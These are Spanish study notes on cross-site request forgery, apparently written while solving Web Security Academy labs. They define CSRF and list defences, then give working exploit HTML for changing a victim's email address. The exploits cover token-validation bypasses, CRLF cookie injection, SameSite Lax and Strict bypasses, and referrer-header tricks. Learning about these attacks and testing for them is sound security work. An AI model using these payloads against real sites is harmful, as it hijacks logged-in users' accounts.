
----------
# Definición

>**Cross-Site Request Forgery (CSRF)**, o **falsificación de petición en sitios cruzados**, es un tipo de vulnerabilidad de seguridad en aplicaciones web que permite a un atacante engañar a un usuario autenticado para que ejecute acciones no deseadas en una aplicación web en la que está autenticado.

## Cómo funciona

1. El usuario **inicia sesión** en un sitio web legítimo (por ejemplo, su banco).
    
2. Mientras está autenticado, el usuario **visita un sitio malicioso** (por ejemplo, un blog comprometido).
    
3. Ese sitio malicioso **envía** una **solicitud** (por ejemplo, una transferencia de dinero) al **sitio legítimo** usando las cookies del usuario, que el navegador envía automáticamente.
    
4. El **sitio legítimo**, si no valida adecuadamente la autenticidad de la solicitud, **ejecuta la acción** como si el usuario la hubiera solicitado voluntariamente.

## Prevención

- **Tokens CSRF**: incluir un token único y secreto en cada formulario o solicitud sensible.
    
- **Cabeceras personalizadas**: que solo puedan ser enviadas mediante JavaScript legítimo del mismo sitio.
    
- **SameSite Cookies**: establecer atributos en cookies para limitar el envío entre sitios.
    
- **Verificación del Referer o Origin** en el servidor.

----------
# Explotación

## Básica

- Se construye un **formulario** html que envie la petición al sitio legítimo.
	``` html
	<html>
		<body>
			<form action="https://0a8e001e03f713cd8087c11400a60017.web-security-academy.net/my-account/change-email" method="POST">
				<input required="" type="hidden" name="email" value="hacker@evil-user.net" />
				<input type="submit" value="Submit request" />
			</form>

			<script>
				history.pushState('', '', '/');
				document.forms[0].submit();
			</script>
		</body>
	</html>
	```
	-*history.pushState()* cambia la url para ocultar el payload.
	-_document.forms[0].submit()_ lanza petición del formulario.

---------
# Bypass de la validación del CSRF-Token

## Change Request Method

- Se puede llegar a bypassear la validación del token cambiando el método donde se tramita la acción, si esta validación está ligada a ese método.
	Por lo que si la solicitud de cambio de email se tramita por **POST**, si la tramitamos por **GET** podemos llegar a bypassear la comprobación.

## Validation if token being present

- Puede que la validación solo se dé cuando el token está presente en la petición, por lo que el bypass se daría **eliminando** el parámetro del **token** de la solicitud.

## Token no vinculado a la sesión

- Si el token no está vinculado a la sesión, se puede emplear **cualquier token** de cualquier usuario **activo** en el momento de lanzar la petición.

## Token vinculado a una cookie non-Session

- Si el token está vinculado a una cookie que no es de sesión, si se encuentra una vulnerabilidad de **inyección de cabeceras HTTP**, se puede tratar de sobrescribir la cookie por un valor que conozcas para que al compararse con el csrf (valor que controlas) se bypassee la restricción.
	Ejemplo de inyección de cabecera:
	-*Petición*
	``` java
	GET /?search=testing%0d%0aSet-Cookie:%20csrfKey=hacked%3b%20SameSite=None HTTP/2
	```
	-*Respuesta*
	``` java
	HTTP/2 200 OK
	Set-Cookie: LastSearchTerm=testing
	Set-Cookie: csrfKey=hacked; SameSite=None; Secure; HttpOnly
	```
	-*SameSite=None* permite que la cookie se mantenga al acceder desde una página externa.
	``` html
	<form action="https://0ae7006203acd9568163b1a800fa0086.web-security-academy.net/my-account/change-email" method="POST">
		<input type="hidden" name="email" value="gg@gg.com" />
		<input type="hidden" name="csrf" value="AOoW8ou7GTB4R1ZhCj1djHrVbJYVv1kn" />
	</form>

	<img src="https://0ae7006203acd9568163b1a800fa0086.web-security-academy.net/?search=testing%0d%0aSet-Cookie:%20csrfKey=eVLX3j7qlVP8YRnTSnWa3fXchZele8O0%3b%20SameSite=None" onerror="document.forms[0].submit()">
	```

## Token duplicado en Cookie ("Double Submit" CSRF Prevention Technique)

- En este caso, existe una cookie, por ejemplo "csrf" con un valor que al tratar de hacer una solicitud de acción al servidor, se copia en un parámetro csrf.
	Esto es el **mismo caso que el token vinculado a una cookie non-Session**, ya que si conseguimos modificar el valor de la cookie csrf y en la petición setteamos el mismo valor para el parámetro csrf, se consigue realizar la acción.

---------
# SameSite Lax bypass

Las cookies solo se mantendrán en *navegaciones de nivel superior*. Por ejemplo, a través de un enlace.

## Via method override

- Si al cambiar de método para realizar la acción el servidor devuelve **"Method not allowed"**, se puede tratar de realizar un method override, que consiste en engañar al servidor para que se crea que estás realizando un tipo de petición (por ejemplo POST) pero en realidad estás realizando otro (GET).
	Se lleva a cabo añadiendo un parámetro **"\_method"** al que le asignas el tipo de petición que quieres que crea el servidor.
	``` URL
	http://vulnerable.com/account/change-email/?email=test%40test.com&_method=POST
	```

## Via cookie refresh

- Si se está utilizando **OAuth** para el manejo de sesiones, si el usuario ya se ha logueado previamente pero ahora se encuentra deslogueado, si trata de entrar OAuth le asignará una nueva cookie de sesión sin necesidad de proporcionar credenciales.
	Esto entonces se puede explotar solicitando un inicio de sesión para conseguir la nueva cookie y después efectuar la acción.
	Ejemplo de explotación:
	``` html
	<form action="https://0a37006a033e2a50807503c900c100e0.web-security-academy.net/my-account/change-email" method="POST">
		<input type="hidden" name="email" value="hacked@hacked.com" />
	</form>

	<script>
		window.open("https://0a37006a033e2a50807503c900c100e0.web-security-academy.net/social-login");
		setTimeout(update_email, 5000);

		function update_email(){
			document.forms[0].submit();
		}
	</script>
	```

--------
# SameSite Strict bypass

Las cookies que tengan *SameSite=Strict* no se mantendrán si la petición se origina desde un sitio ajeno al servidor local.

## Via client-side redirection

- Si se encuentra una funcionalidad de redirección dentro de la web la cual se puede controlar, se puede aprovechar para redireccionar a una acción. De este modo se mantiene la cookie de sesión.
	En el ejemplo, la vulnerabilidad de redireccionamiento está en el campo *postId*:
	``` html
	<script>
		location = "https://0a2400490319d99c82a706fa00c200a1.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=hacked%40gg.com%26submit=1";
	</script>
	```

## Via sibling domain

- Si existe otro dominio vulnerable a *XSS* que está presente en una cabecera HTTP
	``` java
	Access-Control-Allow-Origin: http://secondDomain.com
	```
	se puede utilizar para realizar acciones de forma parecida a como se haría mediante client-side redirection.

------------
# Bypass de la validación del Referer

A menudo se utiliza un mecanismo de protección contra CSRF basado en la **cabecera** Referer de la petición, para bloquear ataques de páginas terceras.

## Validation if header being present

- Si la validación solo ocurre si la cabecera está presente en la petición, se puede borrar esta utilizando etiquetas `<meta>` para indicar al navegador que la solicitud se mandará sin esta cabecera.
	Ejemplo de exploit:
	``` html
	<html>
		<head>
			<meta name="referrer" content="no-referrer">
		</head>
		<form action="https://0ac40076044280c681818e080021000b.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="pwned@pwned.com" />
		</form>

		<script>
			document.forms[0].submit();
		</script>
	</html>
	```

## Via broken referer validation

- Si el servidor solo valida que el Referer tenga cierto contenido dentro y no que solo tenga ese contenido, se puede aprovechar para, mediante la política `unsafe-url`, introducir toda la *URL* en el Referer. De esta forma, si el exploit lo renombramos al valor que se espera en el Referer, se consigue bypassear la validación.
	Ejemplo:
	``` html
	<meta name="referrer" content="unsafe-url">
	```
	URL del exploit en el servidor de atacante:
	``` URL
	https://exploit-0ad800b60442e3fb80df7b1601ea00fa.exploit-server.net/https://0a1900240446e312806a7caa00300055.web-security-academy.net
	```